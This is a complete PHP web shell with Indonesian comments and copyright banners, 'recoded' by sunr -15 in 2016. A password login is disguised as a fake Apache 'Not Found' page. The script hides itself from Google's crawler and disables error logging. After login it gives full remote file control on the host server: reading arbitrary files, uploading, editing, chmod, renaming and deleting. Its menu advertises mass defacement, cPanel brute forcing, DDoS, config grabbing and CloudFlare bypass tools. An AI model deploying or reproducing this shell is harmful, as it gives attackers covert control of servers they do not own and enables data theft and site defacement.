<!--
	//++++++++++++++++++++++++++++++++++++++//
	// Recoded By : sunr -15 ++++//
	//copyright (c) 2016 +++++++++++++++++++//
	//rilis : 28 April 2016 +++++++++++++++//
	//Open Source shell By : WOS - Shutdown57-sunr -15/
	//++++++++++++++++++++++++++++++++++++++//
|___________________________________________________|
|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
\\ hargailah karya orang, kelak kau akan di hargai   ///////
\\kalau ingin mengedit sedikit jangan ganti copyrightNya //
\\kalau ingin merombak rombaklah !,dan jangan sampai /////
\\kelihatan bahwa seni ini milik WithOutShadow //////////
//anda mendapatkan ini dengan gratis. !\\\\\\\\\\\\\\\\\\
//tapi anda tidak bisa mengEdit ini dengan seEnaknya\\\\\\
//saya percaya anda bahwa anda tidak akan mengganti\\\\\\\\
//////COPYRIGHT (C) 2015 WITHOUTSHADOW\\\\\\\\\\\\\\\\\\\\\\
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 BUG REPORT : newbieanyar30@gmail.com ~~~~~~~~~~
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-->

<!-- Ini BUat Login KeShell-->
<?php
$auth_pass = "20467a737c7257d801349d7e832a2490"; //default pass=sonsun
$color = "#00ff00"; 
$default_action = 'FilesMan'; 
@define('SELF_PATH', __FILE__); 
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
    header('HTTP/1.0 404 Not Found'); 
    exit; 
} 
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('VERSION', '2.1'); 
if( get_magic_quotes_gpc() ) { 
    function stripslashes_array($array) { 
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
    } 
    $_POST = stripslashes_array($_POST); 
} 

function printLogin() { 
    ?> 
    <!--Tampilan Login-->
<title> Page Not Found </title>
<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p> 
<hr> 
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center> 
    <form method=post> 
    <input type=password name=pass> 
    </form></center> 

    <?php 
    exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_pass ) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();

set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
?>
<!DOCTYPE HTML>

<!--Tampilan ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ Shellnya-->

<HTML>
<HEAD>
<title>+sunR -15 shell</title>
<style>
body{
    font-family:Anonymous Pro ;
    background-color:#111515;
    color:lime;
    border-color:lime;
    border-style:dotted solid;;
    border-size:10px;
    border-radius:3px;
    box-shadow:0px 0px 12px red inset;
}
#content tr:hover{
    background-color: #111515;
}
#content .first{
    background-color:#0d1d1d;
}
#content .first:hover{
    background-color:#0d1d1d;
}
table{
    border: 3px #0d1d1d dotted;
    box-shadow:0px 0px 4px red;
    background-color:#090e0e;
}
a{
    color: white;   
    text-decoration:none;
}
a:hover{
    color: #81ff00;
    border-style:solid dotted;
    border-radius:3px;
    text-decoration:underline;
}
textarea {
    width:95%;
    box-shadow:0px 0px 5px red;
    border:dotted;
}
input,select,textarea{
    border: 1px #090e0e dotted;
    background: #090e0e;
    color:#fff;
}
#upload{
	color:#fff;
	background:#000;

}
#upload:hover{
	color:#fff;
	background:#000;
	text-decoration:none;
	border-size:3px;
	cursor:help;
}
#qq:hover {
    width:210px;
    height:260px;
    cursor:pointer;
}
#t:hover{
    width:250px;
    height:260px;
    cursor:pointer;
}
#copi {
     width: 100%;
      color: white;
     border:solid;
     border:0;
     text-align: center;
     font-family:Anonymous Pro;
     font-size: 24px;
     text-shadow:0px 0px 20px #CC00CC;
    box-shadow:0px 0px 12px red inset    
}
    .tekan {border: 1px solid;cursor:pointer;text-decoration:none;border-color:red;border-radius:2px;}
    .tekan:hover {text-decoration:none;border: 3px solid;border-radius:3px}
#sw {
    box-shadow:0px 0px 9px red;
     border-radius:5px;
}
    #btn a{color:lime;background:#000;border:2px solid #red;margin-right:5px;padding:1px;}
    #btn a:hover{color:red;border-top:3px solid #f00;border:2px solid lime}
</style>
</HEAD>
<BODY>

<!-- Link nya ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ yaaa -->

<link rel="shortcut icon" href="http://ranggaaditya.hexat.com/persijap.png" />
<link href="https://fonts.googleapis.com/css?family=Anonymous+Pro" rel="stylesheet" type="text/css">

<!-- Buat++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++TOMBOL -->

<div class="main">
<div class="head_info">
<center>
<table id="sw">
<tr><td><img id="t" width="240" height="250" src="https://4.bp.blogspot.com/-Abc1NJH-FTs/VMFG4aKYeiI/AAAAAAAADLM/EBCl0p9LTRM/s1600/pancasila%28welogo.blogspot.com%29.png" style="border-right:1px solid red;border-radius:5px" /></td>
<?php
echo '
<td><center>Software : ';echo $_SERVER['SERVER_SOFTWARE'];
echo'</br>
System OS : ';echo $_SERVER['HTTP_USER_AGENT'];
echo'</br>
Ip: ';echo $_SERVER['REMOTE_ADDR'];
echo' | Admin : ';echo $_SERVER['SERVER_ADMIN'];
echo'</br>
</center></td>
<td><img id="qq" width="200" height="250" src="http://ranggaaditya.hexat.com/persijap.png" style="border-left:1px solid red;border-radius:5px" /></td>
';?>
</tr></table>
</div>
<center>
<!-- Buat++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++EFEK TURUN -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script type="text/javascript"> 
$(document).ready(function(){
    $("#menu").hide();
    $(".head_info").hide();
    $("#klik_menu").click(function(){
        $("#menu").slideToggle();
    });
    $("#klik_head").click(function(){
        $(".head_info").slideToggle();
    });
});
</script>
<!-- SELESAIIIIIIIIIIIIIIIIIIIII -->
<br><br>
<div id="btn" align="center">
<a id="klik_menu" class="tekan">| Tools |</a> <a id="klik_head" class="tekan">| Info |</a>
<br><br>
<div id="menu">
<center><img width="400" src="http://www.clipartbest.com/cliparts/KTn/gp5/KTngp5bjc.png" /> </center>
<hr style="margin-bottom:3%;align:center;width:60%;color:lime;box-shadow:0px 0px 9px blue">
<a href="?<?php echo "y=".$pwd;?>// Recoded By : sunr -15 ++++//" class="tekan">| Home |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=shell // Recoded By : sunr -15 ++++//" class="tekan">| Shell |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=sql // Recoded By : sunr -15 ++++//" class="tekan">| Mysql |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=dump // Recoded By : sunr -15 ++++//" class="tekan">| DB Dump |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo // Recoded By : sunr -15 ++++//" class="tekan">| PHPinfo |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit // Recoded By : sunr -15 ++++//" class="tekan">| NetSploit |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=upload // Recoded By : sunr -15 ++++//" class="tekan">| Upload |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mail // Recoded By : sunr -15 ++++//" class="tekan">| EMail |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=sqli-scanner // Recoded By : sunr -15 ++++//" class="tekan">| SQLI Scan |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=port-sc // Recoded By : sunr -15 ++++//" class="tekan">| Port Scan |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=bpls // Recoded By : sunr -15 ++++//" class="tekan">| Bypass LiteSpeed |</a><br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=dos" class="tekan">| DDoS |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=tool" class="tekan">| Tools |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=python" class="tekan">| python |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=symlink" class="tekan">| Symlink |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=config" class="tekan">| Config |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=bypass" class="tekan">| Bypass |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=cgi" class="tekan">| CgiShell |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=cgi2012" class="tekan">| CGI Telnet 2012 |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=domain" class="tekan">| Domain viewer |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=vb" class="tekan">| VB IndChange |</a><br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=jump" class="tekan">| Jumping Server |</a><br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=joomla"class="tekan">| Joomla tools |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=wp" class="tekan">| Wordpress tools |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=whmcs" class="tekan">| WHMCS Decoder |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=zone" class="tekan">| Zone-H |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mass" class="tekan">| Mass Deface |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=brute" class="tekan">| Cpanel BruteForce |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=bypass-cf" class="tekan">| Bypass CloudFlare |</a><br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=adfin" class="tekan">| Admin Finder |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=hash" class="tekan">| Password Hash |</a><br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=hashid" class="tekan">| Hash ID |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=string" class="tekan">| encode decode |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=whois" class="tekan">| Website Whois |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=cms_detect" class="tekan">| Cms Detector |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=cg" class="tekan">| config grabber |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=html" class="tekan">| html code grabber |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=about" class="tekan">| About |</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=logout" class="tekan">| Log-Out |</a><br>
<hr style="margin-top:2%;margin-bottom:1%;color:lime;box-shadow:0px 0px 9px blue;width:30%">
</b>++-- Use your BRAIN instead of your STRENGTH --++</b>
</div></center>



<!-- menu++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++end -->
</form></div>
<br/>
<?php echo'
<table width="90% border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Location   : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Upload succes</font><br />';
}else{
echo '<font color="red">Upload file error</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
File Upload : <input type="file" name="file"  />
<input type="submit" value="Upload" id="upload"/>
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Pengubahan Permisi Berhasil Kaka yang tamvanz ~_~</font><br />';
}else{
echo '<font color="red">sayangNya,Pengubahan permisi gagal !</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="simpan !" style="margin-top:3%;"/>
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">perubahan nama berhasil kaka ~_~</font><br />';
}else{
echo '<font color="red">Perubahan nama gagal kaka --__-- </font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="40" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Simpan !" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Pinter sekali, Berhasil Edit File ~_~</font><br />';
}else{
echo '<font color="red">Edit file gagal, kaka kurang tamvanz -_-</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src" >'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Simpan !" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Delete Dir Done.</font><br />';
}else{
echo '<font color="red">Delete Dir Error.</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Hapus file berhasil kaka ~_~</font><br />';
}else{
echo '<font color="red">kaka enggak bisa Hapus file ini,kurang tamvanz -_-</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '
<div id="content"><table width="90%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permission</center></td>
<td><center>Action</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>-----</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\">action</option>
<option value=\"delete\">Hapus</option>
<option value=\"chmod\">Change Mode</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br /><center>
<table id="copi" border="0">
    <tr>
        <td> &#169 2016 recoded By : +sunR -15 || Thanks WithOutShadow - Shutdown57</td>
    </tr>
</table>
</BODY>
</HTML>';

function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>